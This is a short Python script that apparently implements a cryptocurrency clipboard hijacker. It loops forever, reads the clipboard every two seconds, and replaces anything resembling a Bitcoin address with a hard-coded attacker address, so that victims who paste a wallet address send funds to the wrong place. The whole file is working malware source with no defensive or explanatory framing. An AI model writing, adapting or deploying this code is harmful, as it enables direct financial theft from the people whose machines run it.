import pyperclip
import time

# BTC Address to replace clipboard contents with
FAKE_BTC = "1HACK3DF4KEADDR355BYOBL1V10N"

def hijack():
    recent_value = ""
    while True:
        tmp = pyperclip.paste()
        if tmp != recent_value and "1" in tmp and len(tmp) in range(26, 35):
            pyperclip.copy(FAKE_BTC)
            recent_value = FAKE_BTC
        time.sleep(2)
